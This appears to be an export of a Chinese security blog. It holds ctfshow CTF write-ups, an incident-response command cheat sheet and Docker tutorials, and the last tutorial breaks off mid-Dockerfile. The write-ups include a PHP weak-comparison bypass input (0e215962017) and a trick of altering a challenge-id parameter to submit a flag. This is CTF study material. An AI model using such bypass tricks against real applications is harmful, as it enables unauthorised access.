<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/juanwang-osint-hxxl.png"></p>
<p>ctfshow{强仔咸鱼_13912345670_8233333}</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>暂时写这么多吧，之后就不更新了。个人建议还是不要在这个模块上面花费太多精力^_^</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】群友挑战-wp</title>
    <url>/ctfshow/%E3%80%90ctfshow%E3%80%91%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-wp.html</url>
    <content><![CDATA[<h1 id="CTFshow福利抽奖"><a href="#CTFshow福利抽奖" class="headerlink" title="CTFshow福利抽奖"></a>CTFshow福利抽奖</h1><p>好家伙，打开容器就是flag，但是群主把提交的框隐藏了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jWeDx.png"></p>
<p>观察URL中的数字，发现这一题的value是1089<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jWEvR.png"></p>
<p>打开其他任意一题，修改challenge-id的value值，提交成功<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jWZK1.png"></p>
<h1 id="损坏的文件"><a href="#损坏的文件" class="headerlink" title="损坏的文件"></a>损坏的文件</h1><p>stegsolve一把梭，另存为png文件，flag就在图片上<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jWk8J.png"></p>
<h1 id="寻找坐标"><a href="#寻找坐标" class="headerlink" title="寻找坐标"></a>寻找坐标</h1><blockquote>
<p>这张图片里面隐藏了NASA的发动机实验室坐标，你能找出来吗？</p>
</blockquote>
<blockquote>
<p>坐标请删除非字母和数字的符号，字母全部大写 flag格式为ctfshow{NASA发动机实验室坐标}</p>
</blockquote>
<p>直接谷歌到<a href="https://supercodepower.com/NASA-parachute-binary">坐标</a></p>
<h1 id="富婆我来了"><a href="#富婆我来了" class="headerlink" title="富婆我来了"></a>富婆我来了</h1><p>根据提示，在群文件下载文件<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/2jWA29.png"></p>
<p>将附件内容与群文件内容一一对应，找到中文即可</p>
<blockquote>
<p>214,1—&gt;我<br>221,7—&gt;也<br>233,35—&gt;想<br>15,45—&gt;找<br>65,67—&gt;三<br>57,37—&gt;十<br>115,27—&gt;六<br>229,8—&gt;迪<br>232,27—&gt;的<br>101,48—&gt;富<br>124,94—&gt;婆</p>
</blockquote>
<h1 id="FW我来了"><a href="#FW我来了" class="headerlink" title="FW我来了"></a>FW我来了</h1><p>notepad++或其他编辑器打开</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[&#123;000214A0-0000-0000-C000-000000000046&#125;]</span><br><span class="hljs-attr">Prop3</span>=<span class="hljs-number">19</span>,<span class="hljs-number">2</span><br><span class="hljs-section">[InternetShortcut]</span><br><span class="hljs-attr">Modified</span>=<span class="hljs-number">63746673686</span>f777b666c61675f69735f6c6f76657d<br><span class="hljs-attr">IconFile</span>=C:\WINDOWS\system32\SHELL32.dll<br><span class="hljs-attr">IconIndex</span>=<span class="hljs-number">10</span><br><span class="hljs-attr">IDList</span>=<br><span class="hljs-attr">URL</span>=https://ctf.show/<br></code></pre></td></tr></table></figure>

<p>将modified的值转字符串即可</p>
<h1 id="病毒我来了"><a href="#病毒我来了" class="headerlink" title="病毒我来了"></a>病毒我来了</h1><p>解压后直接用010或者strings可以看到flag就在最后，不过是16进制的，转成字符串即可</p>
<h1 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h1><p>MD5等于自身，如md5($a)&#x3D;&#x3D;$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E5%A4%8D%E8%AF%BB%E6%9C%BA.png"></p>
<h1 id="解题姬02"><a href="#解题姬02" class="headerlink" title="解题姬02"></a>解题姬02</h1><p>很有意思的一题</p>
<p>使用mumuzi解题姬脚本自动解题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> mumuzi <span class="hljs-keyword">import</span> mumuzi<br><br>taoshen=mumuzi()<br>f=<span class="hljs-string">&#x27;flag.tao6000000&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60000</span>):<br>    taoshen.talk()<br>    f=taoshen.solve(f)<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-%E8%A7%A3%E9%A2%98%E5%A7%AC-1.png"></p>
<p>得到一个<code>flag.layer5999880</code></p>
<p>取出其中的rar文件，在注释中发现hint</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/ctfshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98-%E8%A7%A3%E9%A2%98%E5%A7%AC-2.png"></p>
<p>找到文件的修改时间为<code>2021/10/23 7:08</code></p>
<p>往前推一个月就是<code>2021/09/23</code></p>
<p>在pypi上找这天的版本，有<code>0.1.0-0.1.4</code>五个版本</p>
<p>最终在<code>0.1.3</code>版本的<code>taoshenyulu.py</code>得到flag</p>
<h1 id="TH185"><a href="#TH185" class="headerlink" title="TH185"></a>TH185</h1><p>一脸懵逼，完全看不懂题目，二刺螈浓度太高了</p>
<p>在题目给出的wiki中爆破+猜 拿到flag（因为例子给的是<code>CLASSICLAGER</code>，那就爆破类似的字符串，得到<code>ASAHIMARUEFU</code>）</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/TH185-1.png"></p>
<p>未完待续。。。</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>hw面试题</title>
    <url>/hw/hw%E9%9D%A2%E8%AF%95%E9%A2%98.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="54255f22429b4db3602c3a34c566cfc40a3b1912bb8cd0b8adefd1f366628b59"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>hw</category>
      </categories>
      <tags>
        <tag>hw</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应中的常用命令</title>
    <url>/hw/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B8%AD%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</url>
    <content><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p><strong>应急响应流程</strong></p>
<p>事件判断：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DDos等等</p>
<p>临时处置：给出客户临时处置建议，断网隔离，保护现场环境</p>
<p>信息收集分析：收集客户信息和中毒主机信息，包括样本，日志分析、进程分析、启动项分析</p>
<p>清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件</p>
<p>产出报告：整理并输出完整的安全事件报告</p>
<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="重要文件和目录"><a href="#重要文件和目录" class="headerlink" title="重要文件和目录"></a>重要文件和目录</h2><table>
<thead>
<tr>
<th>文件名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;passwd</td>
<td>用户信息文件</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;crontab</td>
<td>定时任务文件</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;anacrontab</td>
<td>异步定时任务</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;rc.d&#x2F;rc.local</td>
<td>开机启动项</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;hosts</td>
<td>本地IP地址域名解析文件</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>登录失败日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>包含用户登录日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>当前登陆系统的用户信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;cron</td>
<td>定时任务执行日志</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>所有用户最近登录信息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>验证，授权等日志</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>目录</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;root&#x2F;.ssh</td>
<td>root用户ssh公钥和私钥</td>
</tr>
<tr>
<td>&#x2F;tmp</td>
<td>系统或用户临时文件的目录</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;init.d</td>
<td>开机启动项</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log</td>
<td>日志默认存放目录</td>
</tr>
</tbody></table>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>查看当前目录下所有文件并排序<br><code>ls -alt</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-1.png"></p>
<p>查看系统内存使用情况<br><code>free -h</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-2.png"></p>
<p>查看系统进程及子进程<br><code>ps auxf</code>、<code>top</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-3.png"><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-4.png"></p>
<p>查看网络连接<br><code>netstat -antpl</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-5.png"></p>
<p>根据pid使用<code>ls -alh /proc/pid</code>命令查看对应的可执行程序</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-6.png"></p>
<p>查询端口打开的文件<br><code>lsof -i:port</code></p>
<p>查询进程打开的文件<br><code>lsof -p pid</code></p>
<p>查询用户打开的文件<br><code>lsof -u root</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-7.png"></p>
<p>修改文件属性<br><code>chattr</code></p>
<p>显示文件属性<br><code>lsattr</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-8.png"></p>
<p>排查启动项<br><code>cat /etc/rc.local</code><br><code>ls -alt /etc/profile.d/*.sh</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-9.png"></p>
<p>查看所有用户的定时任务<br><code>cat /etc/passwd | cut -f 1 -d : | xargs -I &#123;&#125; crontab -l -u &#123;&#125;</code><br><code>ls -altr /var/spool/cron/*</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-10.png"></p>
<p>查看历史命令<br><code>history</code><br><code>cat ~/.bash_history</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-11.png"></p>
<p>校验软件包<br><code>rpm -Va</code><br><code>dpkg --verify</code></p>
<table>
<thead>
<tr>
<th>值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>S</td>
<td>表示对应文件的大小不一致</td>
</tr>
<tr>
<td>M</td>
<td>表示对应文件权限和所有权不一样</td>
</tr>
<tr>
<td>5</td>
<td>表示对应文件的MD5不一致</td>
</tr>
<tr>
<td>D</td>
<td>表示文件的设备号和驱动程序不一致</td>
</tr>
<tr>
<td>L</td>
<td>表示文件的符号连接内容不一致</td>
</tr>
<tr>
<td>U</td>
<td>表示文件所有者不一致</td>
</tr>
<tr>
<td>G</td>
<td>表示文件群组不一致</td>
</tr>
<tr>
<td>T</td>
<td>表示文件的修改时间不一致</td>
</tr>
</tbody></table>
<blockquote>
<p>软件更新会导致大小或MD5不一致，同时出现SM5需要注意</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-12.png"></p>
<p>查看文件（目录）详细信息<br><code>stat</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-13.png"></p>
<p>查找当前目录下，指定天数内修改的指定类型文件<br><code>find / -mtime 0 -name *.jsp</code></p>
<p>查找当前目录下，指定天数内新增的指定类型文件<br><code>find / -ctime 0 -name *.jsp</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-14.png"></p>
<p>比较文件差异<br><code>diff -c</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-15.png"></p>
<p>查找隐藏进程<br><code>ps -ef | awk &#39;&#123;print $2&#125;&#39; |sort -n |uniq &gt; ps.p</code><br><code>ls /proc |sort -n |uniq &gt; proc.p</code><br><code>diff ps.p proc.p</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-16.png"></p>
<p>查看用户登录历史记录<br><code>last</code></p>
<p>查看用户登录失败记录<br><code>lastb</code></p>
<p>查看用户最近一次登录信息<br><code>lastlog</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-17.png"></p>
<p>登录成功的IP<br><code>grep &quot;Accepted&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p>
<p>定位有爆破行为的IP<br><code>grep &quot;Failed&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; |sort |uniq -c |sort -nr | more</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-18.png"></p>
<p>查找每个IP地址的失败登录次数：<br><code>awk &#39;/sshd.*Failed/ &#123;print $(NF-3)&#125;&#39; /var/log/secure | sort | uniq -c |sort -nr</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-19.png"></p>
<p>查找特定IP地址的失败登录：<br><code>grep &quot;sshd.*Failed.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-20.png"></p>
<p>查找特定IP地址的成功登录：<br><code>grep &quot;sshd.*Accepted.*from &lt;IP_ADDRESS&gt;&quot; /var/log/secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-21.png"></p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">Linux日志类型大致可以分为三类，内核和系统日志，用户日志，应用日志<br><br>内核和系统日志：这种日志主要由syslog管理、根据其配置文件/etc/syslog.conf中的设置决定内核消息和各种系统程序信息记录到哪个位置<br>用户日志：用户日志主要记录系统用户登录或者退出的信息，包括用户名账号、登录时间、源IP等<br>应用日志：记录应用程序运行过程中的各种事件信息<br></code></pre></td></tr></table></figure>

<p>可以使用系统自带的awk，find，grep去分析前面提到的各种日志（建议使用busybox，以防命令被篡改）<br>也可以使用第三方的分析工具，比如LogForensics，星图等等</p>
<h2 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h2><p><strong>busybox</strong></p>
<p>集成了很多linux常用命令的工具集，当命令被劫持或篡改时使用</p>
<p>官网：<a href="https://busybox.net/">https://busybox.net/</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-22.png"></p>
<p><strong>unhide</strong></p>
<p>检测发现借助rootkit及其他技术隐藏的进程和TCP&#x2F;UDP端口的命令行工具</p>
<p><code>yum -y install unhide</code>安装或者在<a href="https://www.unhide-forensics.info/">官网下载</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-23.png"></p>
<p><strong>chkrootkit</strong></p>
<p>linux下检测rootkit的脚本</p>
<p>ubuntu系列安装命令：<code>apt install chkrootkit</code><br>centos系列：由于chkrootkit没有包含在官方的Centos源中，因此要采取手动编译的方法来安装，<a href="https://www.chkrootkit.org/">官网</a></p>
<p>直接运行后查找infected关键字即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-24.png"></p>
<p><strong>clamav</strong></p>
<p>检测木马、病毒、恶意软件和其他恶意威胁的开源防病毒引擎</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/yjxy/yjxy-25.png"></p>
<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>regedit</td>
<td>注册表</td>
</tr>
<tr>
<td>taskmgr</td>
<td>任务管理器</td>
</tr>
<tr>
<td>msconfig</td>
<td>系统配置</td>
</tr>
<tr>
<td>eventvwr</td>
<td>事件查看器</td>
</tr>
<tr>
<td>compmgmt.msc</td>
<td>计算机管理</td>
</tr>
<tr>
<td>gpedit.msc</td>
<td>本地组策略</td>
</tr>
<tr>
<td>taskschd.msc</td>
<td>计划任务</td>
</tr>
<tr>
<td>lusrmgr.msc</td>
<td>本地用户和组</td>
</tr>
</tbody></table>
<p>查看网络连接<br><code>netstat -ano</code></p>
<p>操作系统的详细配置信息<br><code>systeminfo</code></p>
<p>获取系统进程信息<br><code>wmic process</code></p>
<p>根据应用程序查找PID<br><code>wmic process where name=&quot;cmd.exe&quot; get processid,executablepath,name</code></p>
<p>根据PID查找应用程序<br><code>wmic process where processid=&quot;9096&quot; get executablepath,name</code></p>
<p>获取系统进程信息<br><code>tasklist</code></p>
<p>对于要查询特定dll的调用情况，可以使用<br><code>tasklist /d dll名称</code></p>
<p>计算样本MD5<br><code>certutil -hashfile %样本exe% md5</code></p>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>hw</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>容器编排及环境部署</title>
    <url>/docker/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%8F%8A%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2.html</url>
    <content><![CDATA[<h1 id="Dockerfile和docker-compose-yml的区别"><a href="#Dockerfile和docker-compose-yml的区别" class="headerlink" title="Dockerfile和docker-compose.yml的区别"></a>Dockerfile和docker-compose.yml的区别</h1><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile是一个按一定规则编写的包含多行命令的文件，使用Dockerfile可以快速的构建一个定制的镜像。</p>
<h2 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h2><p>使用docker-compose.yaml文件，按照特定的语法语句编写指令，管理多个镜像的部署和端口等操作，实现真证的快速部署。在不同服务器上部署时，只需要一个docker-compose.yaml文件，便能完成应用的部署操作。总之，Docker Compose是用来管理多个容器的。</p>
<h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)&quot;</span> -o <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose     <span class="hljs-regexp">//</span>下载docker-compose<br><br>chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>docker-compose        <span class="hljs-regexp">//</span>赋予执行权限<br><br>docker-compose -version    <span class="hljs-regexp">//</span>查看版本信息&amp;是否安装成功<br></code></pre></td></tr></table></figure>

<h1 id="Compose模板文件"><a href="#Compose模板文件" class="headerlink" title="Compose模板文件"></a>Compose模板文件</h1><p>Docker-Compose标准模板文件应该包含version、services、networks 三大部分，最关键的是services和networks两个部分。</p>
<figure class="highlight nestedtext"><table><tr><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dockercloud/hello-world</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">8080</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">front-tier</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">back-tier</span><br><br>  <span class="hljs-attribute">redis</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">redis</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">web</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">back-tier</span><br><br>  <span class="hljs-attribute">lb</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">dockercloud/haproxy</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">80:80</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">web</span><br>    <span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">front-tier</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">back-tier</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">/var/run/docker.sock:/var/run/docker.sock</span><br><br><span class="hljs-attribute">networks</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">front-tier</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br>  <span class="hljs-attribute">back-tier</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">driver</span><span class="hljs-punctuation">:</span> <span class="hljs-string">bridge</span><br></code></pre></td></tr></table></figure>
<p>下面解释几个常用的命令</p>
<h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><p>Compose目前有三个版本分别为Version 1，Version 2，Version 3，Compose区分Version 1和Version 2（Compose 1.6.0+，Docker Engine 1.10.0+）。Version 2支持更多的指令。Version 1将来会被弃用。</p>
<h2 id="image"><a href="#image" class="headerlink" title="image"></a>image</h2><p>image是指定服务的镜像名称或镜像ID。如果镜像在本地不存在，Compose将会尝试拉取镜像。</p>
<h2 id="build"><a href="#build" class="headerlink" title="build"></a>build</h2><p>服务除了可以基于指定的镜像，还可以基于一份Dockerfile，在使用up启动时执行构建任务，构建标签是build，可以指定Dockerfile所在文件夹的路径。</p>
<p>比如当前目录下有Dockerfile，docker-compose.yml 文件</p>
<p>就会在当前目录下寻找Dockerfile文件进行自动构建镜像，然后使用镜像启动服务容器。</p>
<h2 id="ports"><a href="#ports" class="headerlink" title="ports"></a>ports</h2><p>ports用于映射端口的标签。</p>
<h2 id="volumes"><a href="#volumes" class="headerlink" title="volumes"></a>volumes</h2><p>数据卷，在它下面可以定义的数据卷（名字等等），然后挂载到不同的服务下去使用</p>
<h2 id="networks"><a href="#networks" class="headerlink" title="networks"></a>networks</h2><p>应用的网络，在它下面可以定义应用的名字、使用的网络类型等等</p>
<h1 id="Compose常用命令"><a href="#Compose常用命令" class="headerlink" title="Compose常用命令"></a>Compose常用命令</h1><p><code>docker-compose up</code>：启动服务，如果在后台启动需要参数-d<br><code>docker-compose stop [name]</code>：停止服务<br><code>docker-compose start [name]</code>：启动服务<br><code>docker-compose rm [name]</code>：删除服务，需要停止服务，否则使用-f参数，与docker rm命令类似<br><code>docker-compose down</code>：停止并删除容器，网络，镜像和数据卷<br><code>docker-compose logs -f [name]</code>：查看具体服务的日志</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>构建docker镜像并上传至hub</title>
    <url>/docker/%E6%9E%84%E5%BB%BAdocker%E9%95%9C%E5%83%8F%E5%B9%B6%E4%B8%8A%E4%BC%A0%E8%87%B3hub.html</url>
    <content><![CDATA[<h1 id="使用Dockerfile构建容器"><a href="#使用Dockerfile构建容器" class="headerlink" title="使用Dockerfile构建容器"></a>使用Dockerfile构建容器</h1><p>学习Dockerfile的最好方式就是阅读别人写的Dockerfile，遇到不会的指令就查一查Dockerfile的<a href="https://docs.docker.com/engine/reference/builder/">文档</a></p>
<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>Dockerfile 一般分为 4 部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，“#”为 Dockerfile 中的注释。<br>Dockerfile 主要指令如下：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span>：指定基础镜像，必须为第一个命令。<br><span class="hljs-keyword">MAINTAINER</span>：维护者信息。<br><span class="hljs-keyword">RUN</span><span class="language-bash">：构建镜像时执行的命令。</span><br><span class="hljs-keyword">ADD</span><span class="language-bash">：将本地文件添加到容器中，tar 类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似 wget。</span><br><span class="hljs-keyword">COPY</span><span class="language-bash">：功能类似 ADD，但是是不会自动解压文件，也不能访问网络资源。</span><br><span class="hljs-keyword">CMD</span><span class="language-bash">：构建容器后调用，也就是在容器启动时才进行调用。</span><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash">：配置容器，使其可执行化。配合 CMD 可省去“application”，只使用参数。</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash">：用于为镜像添加元数据。</span><br><span class="hljs-keyword">ENV</span>：设置环境变量。<br><span class="hljs-keyword">EXPOSE</span>：指定与外界交互的端口。<br><span class="hljs-keyword">VOLUME</span><span class="language-bash">：用于指定持久化目录。</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash">：工作目录，类似于 <span class="hljs-built_in">cd</span> 命令。</span><br><span class="hljs-keyword">USER</span>：指定运行容器时的用户名或 UID，后续的 <span class="hljs-keyword">RUN</span><span class="language-bash"> 也会使用指定用户。使用 USER指定用户时，可以使用用户名、UID 或 GID，或是两者的组合。当服务不需要管理员权限时，可通过该命令指定运行用户。</span><br><span class="hljs-keyword">ARG</span>：用于指定传递给构建运行时的变量。<br><span class="hljs-keyword">ONBUILD</span>：用于设置镜像触发器。<br></code></pre></td></tr></table></figure>
<p>接下来以 centos:latest 为基础镜像，安装 jdk1.8 并构建新的镜像 centos-jdk。<br>例：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># CentOS with JDK 8</span><br><span class="hljs-comment"># 指定基础镜像</span><br>FROM centos<br><span class="hljs-comment"># 指定作者</span><br>MAINTAINER lewiserii<br><span class="hljs-comment"># 新建文件夹用于存放 jdk 文件</span><br>RUN mkdir <span class="hljs-regexp">/usr/</span>local/java<br><span class="hljs-comment"># 将 JDK 文件复制到镜像内并自动解压</span><br>ADD jdk-<span class="hljs-number">8</span>.tar.gz <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span><br><span class="hljs-comment"># 创建软链接</span><br>RUN ln -s <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk1.<span class="hljs-number">8.0</span>_281 <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk<br><span class="hljs-comment"># 设置环境变量</span><br>ENV JAVA_HOME=<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/java/</span>jdk<br>ENV JRE_HOME=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br>ENV CLASSPATH=.:<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span><span class="hljs-regexp">/lib:$&#123;JRE_HOME&#125;/</span>lib<br>ENV PATH=<span 